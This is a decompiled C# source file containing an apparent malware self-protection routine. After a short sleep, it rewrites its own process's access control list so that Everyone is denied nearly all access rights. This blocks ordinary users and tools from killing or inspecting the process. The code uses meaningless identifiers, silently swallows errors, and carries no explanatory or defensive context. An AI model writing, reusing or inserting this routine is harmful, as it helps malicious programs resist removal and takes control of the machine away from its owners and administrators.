using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

[StandardModule]
internal sealed class EEqualsElevate
{
	public class EEqualsElevation
	{
		[Flags]
		public enum SalKomEnum
		{
			SalKomSync = 0x100,
			SalKomSrr = 0xF0000,
			SalKomXPaa = 0xF0FFF
		}

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

		private static T SalKomList<T>(ref T L, T M)
		{
			try
			{
				L = M;
				return M;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				T result = default(T);
				ProjectData.ClearProjectError();
				return result;
			}
		}

		public static void SalKomSecurity(IntPtr SalKomXPh, RawSecurityDescriptor SalKomXD)
		{
			try
			{
				byte[] array = new byte[checked(SalKomXD.BinaryLength - 1 + 1)];
				SalKomXD.GetBinaryForm(array, 0);
				if (!SetKernelObjectSecurity(SalKomXPh, 4, array))
				{
					throw new Win32Exception();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}

		public static RawSecurityDescriptor SalKomSecurity2(IntPtr XPh)
		{
			try
			{
				byte[] L = new byte[0];
				uint lpnLengthNeeded = default(uint);
				GetKernelObjectSecurity(XPh, 4, L, 0u, ref lpnLengthNeeded);
				if ((long)lpnLengthNeeded >= 0L && (long)lpnLengthNeeded <= 32767L)
				{
					checked
					{
						if (!GetKernelObjectSecurity(XPh, 4, SalKomList(ref L, new byte[(int)(unchecked((long)lpnLengthNeeded) - 1L) + 1]), lpnLengthNeeded, ref lpnLengthNeeded))
						{
							throw new Win32Exception();
						}
						return new RawSecurityDescriptor(L, 0);
					}
				}
				throw new Win32Exception();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				RawSecurityDescriptor result = null;
				ProjectData.ClearProjectError();
				return result;
			}
		}

		[DllImport("kernel32.dll")]
		public static extern IntPtr GetCurrentProcess();

		[DllImport("advapi32.dll", SetLastError = true)]
		private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

		public static void EEqualsStart()
		{
			Thread.Sleep(5237);
			try
			{
				IntPtr currentProcess = GetCurrentProcess();
				RawSecurityDescriptor rawSecurityDescriptor = SalKomSecurity2(currentProcess);
				rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
				SalKomSecurity(currentProcess, rawSecurityDescriptor);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}
}
